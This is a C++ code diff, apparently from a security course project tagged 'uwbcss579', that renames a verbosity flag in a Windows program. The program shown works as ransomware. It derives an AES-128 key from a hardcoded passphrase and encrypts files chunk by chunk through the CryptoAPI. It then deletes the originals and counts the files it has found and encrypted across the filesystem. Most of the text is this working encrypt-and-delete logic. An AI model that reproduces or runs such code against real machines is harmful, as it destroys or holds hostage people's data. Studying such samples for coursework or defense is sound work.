@@ -14,7 +14,7 @@ namespace fs = std::experimental::filesystem;
 #define CLASSNAME = "uwbcss579";
 #define BLOCK_LEN 128;
 
-bool v = false;
+bool g_Verbosity = false;
 
 bool ExcludePath(std::string checkString)
 {
@@ -57,7 +57,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	LPCWSTR inputFile = std::wstring(fileToEncrypt.begin(), fileToEncrypt.end()).c_str();
 	LPCWSTR outputFile = std::wstring(fileEncrypted.begin(), fileEncrypted.end()).c_str();
 
-	if (v)
+	if (g_Verbosity)
 	{
 		std::wcout << "Key:         " << keyDefault << std::endl;
 		std::cout << "Key (addr):  " << keyString << std::endl;
@@ -69,7 +69,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
 	if (hInputFile == INVALID_HANDLE_VALUE) 
 	{
-		if (v)
+		if (g_Verbosity)
 			std::cout << "Cannot open input file!" << std::endl;
 
 		return false;
@@ -78,7 +78,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hOutputFile == INVALID_HANDLE_VALUE) 
 	{
-		if (v)
+		if (g_Verbosity)
 			std::cout << "Cannot open output file!" << std::endl;
 
 		return false;
@@ -92,7 +92,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) 
 	{
 		dwStatus = GetLastError();
-		if (v)
+		if (g_Verbosity)
 			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
 
 		CryptReleaseContext(hCryptProvider, 0);
@@ -104,7 +104,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash)) 
 	{
 		dwStatus = GetLastError();
-		if (v)
+		if (g_Verbosity)
 			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
 
 		CryptReleaseContext(hCryptProvider, 0);
@@ -115,26 +115,26 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0)) 
 	{
 		DWORD err = GetLastError();
-		if (v)
+		if (g_Verbosity)
 			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
 
 		return false;
 	}
-	//if (v)
+	//if (g_Verbosity)
 		//std::cout << "CryptHashData Success! " << std::endl;
 
 	HCRYPTKEY hCryptKey;
 	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey)) 
 	{
 		dwStatus = GetLastError();
-		if (v)
+		if (g_Verbosity)
 			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
 
 		CryptReleaseContext(hCryptProvider, 0);
 
 		return false;
 	}
-	//if (v)
+	//if (g_Verbosity)
 		//std::cout << "CryptDeriveKey Success! " << std::endl;
 		
 	const size_t chunkSize = BLOCK_LEN;
@@ -156,13 +156,13 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 		if (readTotalSize == inputSize) 
 		{
 			isFinal = TRUE;
-			if (v)
+			if (g_Verbosity)
 				std::cout << "Finalizing encrypted data file." << std::endl;
 		}
 
 		if (!CryptEncrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength, chunkSize)) 
 		{
-			if (v)
+			if (g_Verbosity)
 				std::cout << "CryptEncrypt failed :(" << std::endl;
 			break;
 		}
@@ -170,7 +170,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 		DWORD written = 0;
 		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL)) 
 		{
-			if (v)
+			if (g_Verbosity)
 				std::cout << "WriteFile(output file) failed :(" << std::endl;
 			break;
 		}
@@ -189,7 +189,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 
 bool EncryptAndDeleteThisFile(std::string path)
 {
-	if (v)
+	if (g_Verbosity)
 		std::cout << "Encrypting " << path << " ..." << std::endl;
 
 	bool fEncrypted = false;
@@ -200,7 +200,7 @@ bool EncryptAndDeleteThisFile(std::string path)
 
 	fEncrypted = Cryptor(path, pathEncrypted, "NotMyMonkeysNotMyCircus");
 
-	if (v)
+	if (g_Verbosity)
 		std::cout << "Encrypt result: " << fEncrypted << std::endl;
 	
 	fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
@@ -208,16 +208,16 @@ bool EncryptAndDeleteThisFile(std::string path)
 	{
 		DWORD dwStatus;
 		dwStatus = GetLastError();
-		if (v)
+		if (g_Verbosity)
 			std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
 	}
 	else
 	{
-		if (v)
+		if (g_Verbosity)
 			std::cout << "Delete result:  " << fDeleted << std::endl;
 	}
 
-	if (v)
+	if (g_Verbosity)
 		std::cout << std::endl;
 
 	if (fEncrypted)
@@ -331,7 +331,7 @@ DWORD FindFiles()
 		}
 	}
 
-	if (v)
+	if (g_Verbosity)
 	{
 		std::cout << "Total files found:     " << dwFileCounter << std::endl;
 		std::cout << "Total files encrypted: " << dwEncryptionCounter << std::endl;
@@ -375,11 +375,11 @@ int main(int argc, char* argv[])
 	{
 		if (std::string(argv[1]) == "/v")
 		{
-			v = true;
+			g_Verbosity = true;
 		}
 	}
 
-	if (v)
+	if (g_Verbosity)
 		std::cout << "Verbosity: Enabled" << std::endl;
 
 
